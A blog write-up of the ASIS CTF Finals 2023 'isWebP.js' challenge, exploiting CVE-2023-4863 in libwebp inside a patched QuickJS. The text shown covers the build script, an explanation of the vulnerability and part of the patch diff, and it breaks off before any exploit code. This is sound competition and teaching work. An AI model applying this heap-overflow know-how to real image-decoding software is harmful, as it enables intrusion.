<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>ASIS CTF Finals 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="ASIS CTF Finals 2023" />
<meta property="og:description" content="Writeup for ASIS CTF Finals 2023" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/asis-ctf-finals-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-30T23:44:55+07:00" />
<meta property="article:modified_time" content="2023-12-30T23:44:55+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="ASIS CTF Finals 2023"/>
<meta name="twitter:description" content="Writeup for ASIS CTF Finals 2023"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/asis-ctf-finals-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/0ctf-tctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "ASIS CTF Finals 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/asis-ctf-finals-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, ASIS CTF, pwn, quickjs, huffman, oob, 2023","wordcount":  6560 ,
        "url": "https:\/\/chovid99.github.io\/posts\/asis-ctf-finals-2023\/","datePublished": "2023-12-30T23:44:55+07:00","dateModified": "2023-12-30T23:44:55+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ASIS CTF Finals 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Dec 30, 2023">Dec 30, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6560 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;31 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#iswebpjs">isWebP.js</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#testing-the-heap-overflow">Testing the heap overflow</a></li>
                <li><a href="#gaining-read-and-write-primitive">Gaining read and write primitive</a></li>
                <li><a href="#leaking-values">Leaking values</a></li>
                <li><a href="#gaining-rce">Gaining RCE</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/c1UCD2x.png" title="https://i.imgur.com/c1UCD2x.png" data-thumbnail="https://i.imgur.com/c1UCD2x.png" data-sub-html="<h2>ASIS CTF Finals 2023. We got 8th place.</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/c1UCD2x.png"
            data-srcset="https://i.imgur.com/c1UCD2x.png, https://i.imgur.com/c1UCD2x.png 1.5x, https://i.imgur.com/c1UCD2x.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/c1UCD2x.png" />
    </a><figcaption class="image-caption">ASIS CTF Finals 2023. We got 8th place.</figcaption>
    </figure>
<p>To cap off the fantastic year of 2023, I participated with the <strong>SKSD</strong> team in the ASIS CTF Finals 2023, where we secured 8th place. I extend a huge shoutout and heartfelt thanks to my amazing teammates for their exceptional teamwork throughout the event!</p>
<p>Below is the write-up for the QuickJS pwn challenge named <code>isWebP.js</code>. This challenge is a JavaScript engine pwn task, inspired by <strong>CVE-2023-4863</strong>. This challenge was solved by only three teams, and I was the third to successfully solve it.</p>
<img src="https://i.imgur.com/56eRw7L.png"/>
<h1 id="pwn">Pwn</h1>
<h2 id="iswebpjs">isWebP.js</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Did you know that Javascript doesn&rsquo;t have an image validator by default? That&rsquo;s why I decided to implement something like isNaN for images (isPNG, isJpeg, isWebP). So far I&rsquo;ve only implemented isWebP and I wanna do a beta test before submitting the proposal to ECMA. You can also test the feature via the address below. Can&rsquo;t wait for your feedbacks!</p>
<p>nc 5.75.200.150 1337</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we received an attachment that included the modified <code>quickjs</code>, the altered <code>libwebp</code>, and a <code>compile.sh</code> script for compiling them. Let&rsquo;s first take a look at the <code>compile.sh</code> file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>rm build -r 2&gt;/dev/null
</span></span><span class="line"><span class="cl">mkdir build
</span></span><span class="line"><span class="cl">mkdir build/libwebp/
</span></span><span class="line"><span class="cl">git clone https://chromium.googlesource.com/webm/libwebp/
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> libwebp
</span></span><span class="line"><span class="cl">git checkout 7ba44f80f3b94fc0138db159afea770ef06532a0
</span></span><span class="line"><span class="cl">git apply ../libwebp.patch
</span></span><span class="line"><span class="cl">make -f ./makefile.unix -j4
</span></span><span class="line"><span class="cl">find -name <span class="s1">&#39;*.a&#39;</span> <span class="p">|</span> xargs -I <span class="s1">&#39;{}&#39;</span> cp <span class="s1">&#39;{}&#39;</span> ../build/libwebp
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
</span></span><span class="line"><span class="cl">git clone https://github.com/bellard/quickjs.git
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> quickjs
</span></span><span class="line"><span class="cl">git checkout 2ee6be705fde0eb68acec25915d2947de1207abb
</span></span><span class="line"><span class="cl">git apply ../quickjs.patch
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
</span></span><span class="line"><span class="cl">cp ./quickjs/* ./build -r
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> build
</span></span><span class="line"><span class="cl">make qjs -j4
</span></span><span class="line"><span class="cl">realpath ./qjs
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observing the script reveals that the <code>libwebp</code> version used is vulnerable to the recent exploit <strong>CVE-2023-4863</strong>. This CVE details an issue in <code>libwebp</code> related to constructing the Huffman Table, essential for compressing WebP images. WebP images use Huffman Coding for compression, and <code>libwebp</code> constructs a Huffman Table to decompress them. However, due to inadequate validity checks, it&rsquo;s possible to craft a malicious WebP image that causes heap overflow during table construction.</p>
<p>In search of a proof of concept (POC) online, we discovered a good <a href="https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2023-4863" target="_blank" rel="noopener noreffer ">POC</a> containing a sample malicious WebP image. Before utilizing the malicious image, let&rsquo;s first check the patches implemented by the author.</p>
<p>Examining the <code>libwebp.patch</code> file, the only modification made by the author is the removal of the line of code (LOC) that frees the Huffman table. Therefore, in this challenge, once a Huffman table is allocated, it remains indefinitely.</p>
<p>Next, let&rsquo;s examine the <code>quickjs.patch</code> file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">Makefile</span> <span class="n">b</span><span class="o">/</span><span class="n">Makefile</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="mi">9</span><span class="n">b003f0</span><span class="o">..</span><span class="mi">796</span><span class="n">c76f</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">Makefile</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">Makefile</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">108</span><span class="p">,</span><span class="mi">10</span> <span class="o">+</span><span class="mi">108</span><span class="p">,</span><span class="mi">10</span> <span class="err">@@</span> <span class="n">ifdef</span> <span class="n">CONFIG_WIN32</span>
</span></span><span class="line"><span class="cl"> <span class="n">DEFINES</span><span class="o">+=-</span><span class="n">D__USE_MINGW_ANSI_STDIO</span> <span class="c1"># for standard snprintf behavior</span>
</span></span><span class="line"><span class="cl"> <span class="n">endif</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">CFLAGS</span><span class="o">+=$</span><span class="p">(</span><span class="n">DEFINES</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="n">CFLAGS</span><span class="o">+=$</span><span class="p">(</span><span class="n">DEFINES</span><span class="p">)</span> <span class="o">-</span><span class="n">I</span><span class="o">../</span><span class="n">libwebp</span><span class="o">/</span><span class="n">imageio</span><span class="o">/</span> <span class="o">-</span><span class="n">I</span><span class="o">../</span><span class="n">libwebp</span><span class="o">/</span><span class="n">src</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"> <span class="n">CFLAGS_DEBUG</span><span class="o">=$</span><span class="p">(</span><span class="n">CFLAGS</span><span class="p">)</span> <span class="o">-</span><span class="n">O0</span>
</span></span><span class="line"><span class="cl"> <span class="n">CFLAGS_SMALL</span><span class="o">=$</span><span class="p">(</span><span class="n">CFLAGS</span><span class="p">)</span> <span class="o">-</span><span class="n">Os</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">CFLAGS_OPT</span><span class="o">=$</span><span class="p">(</span><span class="n">CFLAGS</span><span class="p">)</span> <span class="o">-</span><span class="n">O2</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="n">CFLAGS_OPT</span><span class="o">=$</span><span class="p">(</span><span class="n">CFLAGS</span><span class="p">)</span> <span class="o">-</span><span class="n">O0</span>
</span></span><span class="line"><span class="cl"> <span class="n">CFLAGS_NOLTO</span><span class="p">:</span><span class="o">=$</span><span class="p">(</span><span class="n">CFLAGS_OPT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">LDFLAGS</span><span class="o">=-</span><span class="n">g</span>
</span></span><span class="line"><span class="cl"> <span class="n">ifdef</span> <span class="n">CONFIG_LTO</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">168</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">168</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="n">all</span><span class="p">:</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">quickjs</span><span class="o">.</span><span class="n">check</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">check</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">PROGS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="n">QJS_LIB_OBJS</span><span class="o">=$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">quickjs</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">libregexp</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">libunicode</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">cutils</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">quickjs</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">libbf</span><span class="o">.</span><span class="n">o</span> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">QJS_OBJS</span><span class="o">=$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">repl</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">QJS_LIB_OBJS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="n">QJS_OBJS</span><span class="o">=$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">o</span> <span class="o">$</span><span class="p">(</span><span class="n">QJS_LIB_OBJS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">ifdef</span> <span class="n">CONFIG_BIGNUM</span>
</span></span><span class="line"><span class="cl"> <span class="n">QJS_OBJS</span><span class="o">+=$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">qjscalc</span><span class="o">.</span><span class="n">o</span>
</span></span><span class="line"><span class="cl"> <span class="n">endif</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">180</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">180</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="n">LIBS</span><span class="o">+=-</span><span class="n">ldl</span> <span class="o">-</span><span class="n">lpthread</span>
</span></span><span class="line"><span class="cl"> <span class="n">endif</span>
</span></span><span class="line"><span class="cl"> <span class="n">LIBS</span><span class="o">+=$</span><span class="p">(</span><span class="n">EXTRA_LIBS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="n">LIBS</span><span class="o">+=</span><span class="n">libwebp</span><span class="o">/</span><span class="n">libimagedec</span><span class="o">.</span><span class="n">a</span> <span class="n">libwebp</span><span class="o">/</span><span class="n">libwebpdemux</span><span class="o">.</span><span class="n">a</span> <span class="n">libwebp</span><span class="o">/</span><span class="n">libimageenc</span><span class="o">.</span><span class="n">a</span> <span class="n">libwebp</span><span class="o">/</span><span class="n">libimageio_util</span><span class="o">.</span><span class="n">a</span> <span class="n">libwebp</span><span class="o">/</span><span class="n">libwebp</span><span class="o">.</span><span class="n">a</span> <span class="n">libwebp</span><span class="o">/</span><span class="n">libsharpyuv</span><span class="o">.</span><span class="n">a</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> 	<span class="n">mkdir</span> <span class="o">-</span><span class="n">p</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">examples</span> <span class="o">$</span><span class="p">(</span><span class="n">OBJDIR</span><span class="p">)</span><span class="o">/</span><span class="n">tests</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">c</span> <span class="n">b</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="n">c2d63e9</span><span class="o">..</span><span class="n">c08c9a2</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">qjs</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">41</span><span class="p">,</span><span class="mi">8</span> <span class="o">+</span><span class="mi">41</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#include &#34;cutils.h&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#include &#34;quickjs-libc.h&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">extern</span> <span class="k">const</span> <span class="n">uint8_t</span> <span class="n">qjsc_repl</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">extern</span> <span class="k">const</span> <span class="n">uint32_t</span> <span class="n">qjsc_repl_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+//</span> <span class="n">extern</span> <span class="k">const</span> <span class="n">uint8_t</span> <span class="n">qjsc_repl</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="o">+//</span> <span class="n">extern</span> <span class="k">const</span> <span class="n">uint32_t</span> <span class="n">qjsc_repl_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#ifdef CONFIG_BIGNUM</span>
</span></span><span class="line"><span class="cl"> <span class="n">extern</span> <span class="k">const</span> <span class="n">uint8_t</span> <span class="n">qjsc_qjscalc</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl"> <span class="n">extern</span> <span class="k">const</span> <span class="n">uint32_t</span> <span class="n">qjsc_qjscalc_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">118</span><span class="p">,</span><span class="mi">8</span> <span class="o">+</span><span class="mi">118</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="k">static</span> <span class="n">JSContext</span> <span class="o">*</span><span class="n">JS_NewCustomContext</span><span class="p">(</span><span class="n">JSRuntime</span> <span class="o">*</span><span class="n">rt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#endif</span>
</span></span><span class="line"><span class="cl">     <span class="o">/*</span> <span class="n">system</span> <span class="n">modules</span> <span class="o">*/</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>    <span class="n">js_init_module_std</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="s2">&#34;std&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>    <span class="n">js_init_module_os</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="o">//</span> <span class="n">js_init_module_std</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="s2">&#34;std&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="o">//</span> <span class="n">js_init_module_os</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="n">ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">338</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">338</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="ne">int</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="c1">#endif</span>
</span></span><span class="line"><span class="cl">     
